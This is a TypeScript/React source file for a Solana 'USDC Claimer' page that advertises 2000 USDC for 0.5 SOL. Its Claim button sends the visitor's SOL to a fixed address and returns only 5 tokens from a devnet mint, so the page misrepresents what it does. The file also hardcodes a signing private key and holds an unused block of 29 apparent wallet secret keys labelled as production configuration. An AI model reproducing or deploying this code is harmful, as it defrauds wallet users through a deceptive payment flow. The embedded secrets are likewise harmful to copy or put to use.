/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "66xaaNdigt8aMHUYycFRbB1a9HLLTjxoz174Py87PxswiXkuAn6hTuG6mmNriV1NxjX5uhAFDzGu13YBs9knmtjs"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4BJfCaAaL1GjxZyvSyXPPawhms6Mke9VbA4iBesV2SRVhRGdm39EeKtRFucEAkjWxpcztuj196Ku9aT3hmvwVduR",
  "key1": "5SgpzkY5tJGC2vnAhiyNWymu4aJkzCVbZHctQXAX19ZK7JcUhtHGVo8agqr7vxiEzJF4N3KbjhXYicYfiRMfnvLF",
  "key2": "5E4uuM4kfczTsBPe5rXi6NB89Ky7fh2TUKY81uUo1V8KPqtozB2dfbfq3xfxx8kiRfNgtCb1LBt7czM64PgCJpux",
  "key3": "2PGETPYdyhSNNAi77TGXdDTYB3kyz4TosgfKEnr4MSHqicLCBJr7jidz2sBaB5WpZNDmNXSjtRL89GeXQpZQxH9o",
  "key4": "4DoRg7m5rewJsA5kWux2rQaMn7TTQr6wFEB5J6k35kDNfhdehvYXsMkhKapv7y4TqWTky5YqBVMwG9gi495BvGFC",
  "key5": "2eU6QBkzDdt1Vs7Pf1azDnCod8kasihxeDbu54vWofFA9ceHnKUAxBrxuC8GV1FyrgRQ1g3s1U5sEtepMJVhhqpQ",
  "key6": "28UtwpfXcpudWFZmPF19QH8B2z222qfiXZfNhsbTuxiLuKCVKNXpwAPo9Eiuri9LRZvCz9RTHG26cgi7UyHXmQFW",
  "key7": "4jmq9wVXMdAZ77eLpU1Q1jF49T2mwaEPKaWzWbLRdqma91YdMRpoadfLW9P1uRiYz2hy5XYJrkqV1oDERSWjZQXx",
  "key8": "4SzLujoZT5E927ArTZv3HDsdEduDibpBH5ELfX3E3xm58uPppsi9ePt8eCqjWTLf4iQ26eHhDudApqUMJ1tzgcdc",
  "key9": "R1VZqZGiNgDxNTJge6Yt6Tv2EVJPKJQFN5rHdJGuhSUaSHZ4K3NjBmXqiRtwvZfrCoiYo7XGxTpe9ojDnyhMAZx",
  "key10": "5uam5LsorRZjWHqS3oBpbc3nPMW2K3XwwEv6j3ZgpYceR27JAtUJsivGKpdgKZSKTMMVEtn5gBPwPAoyZXyTAiQ9",
  "key11": "3aws3sFCBLmgiLLC5KJYK67sER3WzZikL48zHwwRXUJJatTeFsUQf82ubAXRFhBEbJQWgDo4qhv6WLs8L1bf866H",
  "key12": "2xjk4V6a595rqGY2TBs4Kt5MxtnMjqy1XjgaPVE9nBEu9FW4kdLqZ3GsBU2zABocq7VKPyZnDRxQ9Fu2yD8znSsD",
  "key13": "HfGtfosN6A16HpgCrhAVccuHNpKEDbbqKhMKN6QkEnB6AZsfRZcWxPx1ViEYVCpu2bqyhFndytJBQnojpyFoCfC",
  "key14": "5Ao4C25eA6eUBH9QzB315vANdYQcaZT9hstWhm6nrbSEZutUmApnCQWVkSn1UP5pcxYRD6iJ6xpNgR11uDS1EZLG",
  "key15": "xmJ15GWtKnRv5tBjV2G8VRCRTddhzDznNKG5QzJv1S47gAJCTGeCCQzoTk5WXHJD3GTdF8h2haFaoTasmWYr7Do",
  "key16": "59ZAFdG18MY3fhgAUjJ6xHkHBLqALcm7FqEpB5YNgwRQPyVFMj2oYwhWacvqBMZFuPu8vWtg2DEZJFobiFu7bStn",
  "key17": "2FBkpnydju9AWdKZEkdMNeDttnZTm4E23k7kt4no7rEkRL6ZmB5ABSeqqVVjyR2yTz9bSp7qnQ7mqNjzzFoRTYMK",
  "key18": "hRTynQnJxeAqENaB22kRiy8WYNZp8oGXwzTFFAi2Y6DWTvZUjoTGQP85b7trBevoYrv8PdTGXTDeykVKoDtV4HF",
  "key19": "5yLG9cRnWtcY52Pu7eSUvF56z6EMq8zdu6CC8veVmfFMbBSZGxZ8ngsswKXhSzJJk5DM9uVhJjBdVFd8cqP3mC36",
  "key20": "2WE87NVR7rcQJpiAG9hUtLhzU3VjaRorpTNyiZFgG2KtSVDAZoxnBwg1WggoGfJGbQz13hUPkMRpSFiKci2kP9Na",
  "key21": "wJTFkGRDTKoCq2YTaGqRKqN4cHtCQWm79GfL8xxGehJ7f4rKRqN2Peit33GhYDH63WFdz7TXv5vqFcRALQrDQMm",
  "key22": "3wEatWPLCXJHUMe8xnQmrBK8jfsgkWPzPRNp1st7X8ZQzMWavFpFfK16oGvtEmDQ8xMvZi6VBRxN9ZsrDEmaw7wp",
  "key23": "51p9dxhL1PBWumXGKtijAsHRKTsmx3iK1mDpxP4U5yhtgRKRtJhpJz1yk81Qj9PR1M5UPzH2rcH2v8kcPiRdbTUJ",
  "key24": "4ABKeZvxBSRShT28W9rGpAYbLPpD8j4GNgUcftS5hDoXEoUCVidUr8GpiBWMVPYf7zrbXzdBb6xDisNV26JEfCx2",
  "key25": "4rQ1UwGn16qgygCNAR2jTLAddKdWCp9atnJHUop4JhPu8zMYY8h88NRkb224fd48ZsAzwXBXrGKREqAJuDix5EjC",
  "key26": "5ckXY1F4wL5porxukHbzkbPTdeuiRh8F6RPMbQVmWtQqEmzaEAj7pQvuM4wt26Q6uPrvRu24UxZyMrr2pPVKwH52",
  "key27": "45dbao62c1g4PQarJ5oE1dXeJK4HNnJTkKFdTFzhNzMde2Bm7VFx3ghcNBntQyZNHM2oRcZhfTenjqFisT8uAKfr",
  "key28": "Agrd1Ad9tPrUoRLYzRewqA5WmouPFX38KJJfzAyFmMfXaDoSDRz9TFhWKdzsQLNJ3HqdRxdNPTWhhyN8zs33tkB"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
